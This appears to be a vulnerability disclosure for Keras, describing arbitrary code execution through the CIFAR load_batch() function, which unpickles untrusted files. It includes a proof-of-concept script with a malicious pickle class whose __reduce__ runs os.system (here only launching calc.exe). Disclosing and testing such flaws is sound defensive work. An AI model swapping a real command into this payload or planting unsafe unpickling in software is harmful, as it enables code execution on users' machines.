# Description

`Keras` is an API designed for human beings, not machines. Keras follows best practices for reducing cognitive load: it offers consistent & simple APIs, it minimizes the number of user actions required for common use cases, and it provides clear & actionable error messages. This package is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

`load_batch()` is a function used for parsing `CIFAR` data by unpickling it. But the lack of restriction in input allows attacker constructed files to be unpickled.

# Proof of Concept

# Installation
```bash
git clone https://github.com/keras-team/keras
cd keras/keras
```

# Run exploit.py
```python
#!/usr/bin/env python3

import pickle
import os
from datasets import cifar

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('calc.exe', ))

payload = pickle.dumps(EvilPickle())

with open('payload', 'wb') as f:
    f.write(payload)

cifar.load_batch('payload')
```
